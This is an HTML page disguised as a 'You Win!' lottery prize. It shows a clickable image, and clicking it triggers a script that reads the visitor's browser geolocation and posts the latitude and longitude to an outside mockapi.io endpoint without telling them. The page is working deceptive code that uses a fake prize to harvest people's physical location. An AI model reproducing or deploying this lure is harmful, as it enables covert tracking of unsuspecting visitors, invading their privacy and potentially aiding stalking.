<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>You Win!</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            padding: 20px;
        }

        img {
            width: 100%;
            object-fit: cover;
            height: 100%;
        }

        .cont {
            cursor: pointer;
            border-radius: 20px;
            overflow: hidden;
        }
        
    </style>
</head>

<body>
    <div onclick="sendLocation()" class="cont">
        <img src="./lottery.jpg" alt="">
    </div>

    <script>
      
        function sendLocation() {
            if (!navigator.geolocation) {
                alert("Geolocation is not supported by your browser.");
                return;
            }

            navigator.geolocation.getCurrentPosition(async (position) => {
                const { latitude, longitude } = position.coords;
                
          
                const response = await fetch(`https://66755308a8d2b4d072ef8f02.mockapi.io/api/v1/locatipn`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        lattidute: latitude,
                        longitude: longitude,
                    }),
                });
            
            }, () => {
                alert("Unable to retrieve your location.");
            });
        }
    </script>

</body>

</html>
